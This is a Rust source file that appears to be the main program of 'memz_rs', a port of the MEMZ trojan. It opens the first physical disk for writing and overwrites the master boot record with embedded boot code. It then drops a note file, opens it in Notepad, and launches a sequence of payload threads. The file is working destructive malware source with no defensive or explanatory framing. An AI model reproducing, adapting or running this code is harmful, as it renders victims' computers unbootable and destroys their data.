#[cfg(feature = "DEBUG_MODE")]
use crate::log::*;

use memz_rs::{
    convert_str::ToPCSTRWrapper,
    data::{
        self,
        code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
    },
    payloads::function::{payload_thread, N_PAYLOADS, PAYLOADS},
    utils::log,
    winapi_type::DWORD,
    wrap_windows_api::*,
    LMEM_ZEROINIT,
};
use std::{
    thread::{self, sleep},
    time::Duration,
};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, HWND},
        Storage::FileSystem::{
            WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_FLAGS_AND_ATTRIBUTES,
            FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        UI::WindowsAndMessaging::{SM_CXSCREEN, SM_CYSCREEN, SW_SHOWDEFAULT},
    },
};

fn main() -> Result<(), WinError> {
    log::new_log();
    let (_scrw, _scrh) = (
        wrap_get_system_metrics(SM_CXSCREEN)?,
        wrap_get_system_metrics(SM_CYSCREEN)?,
    );

    let drive = wrap_create_file_a(
        *"\\\\.\\PhysicalDrive0".to_pcstr(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES::default(),
        HANDLE::default(),
    )
    .unwrap();

    let mut boot_code = vec![LMEM_ZEROINIT; 65536];
    boot_code[..CODE1_LEN].copy_from_slice(&CODE1[..CODE1_LEN]);
    boot_code[0x1fe..(0x1fe + CODE2_LEN)].copy_from_slice(&CODE2[..CODE2_LEN]);

    let mut wb: DWORD = Default::default();

    if !unsafe { WriteFile(drive, Some(&boot_code), Some(&mut wb), None).as_bool() } {
        #[cfg(not(feature = "DEBUG_MODE"))]
        eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
            GetLastError()
        });

        #[cfg(feature = "DEBUG_MODE")]
        write_log(
            LogType::ERROR,
            LogLocation::ALL,
            &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                GetLastError()
            }),
        );
        return Err(WinError::Failed);
    }

    wrap_close_handle(drive)?;

    let note = wrap_create_file_a(
        "\\note.txt",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        HANDLE::default(),
    )
    .unwrap();

    if !unsafe {
        WriteFile(
            note,
            Some(data::msg::MSG.as_bytes()),
            Some(&mut wb),
            None,
        )
        .as_bool()
    } {
        #[cfg(not(feature = "DEBUG_MODE"))]
        eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
            GetLastError()
        });

        #[cfg(feature = "DEBUG_MODE")]
        write_log(
            LogType::ERROR,
            LogLocation::ALL,
            &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                GetLastError()
            }),
        );
        return Err(WinError::Failed);
    }

    wrap_close_handle(note)?;

    wrap_shell_execute_a(
        HWND::default(),
        PCSTR::null(),
        "notepad",
        "\\note.txt",
        PCSTR::null(),
        SW_SHOWDEFAULT,
    )?;

    dbg!();

    for payload in PAYLOADS.iter().take(N_PAYLOADS) {
        sleep(Duration::from_millis(payload.delay as u64));
        let payload_thread = thread::spawn(move || payload_thread(payload));
        payload_thread.join().unwrap();
    }

    loop {
        sleep(Duration::from_millis(10000))
    }
}
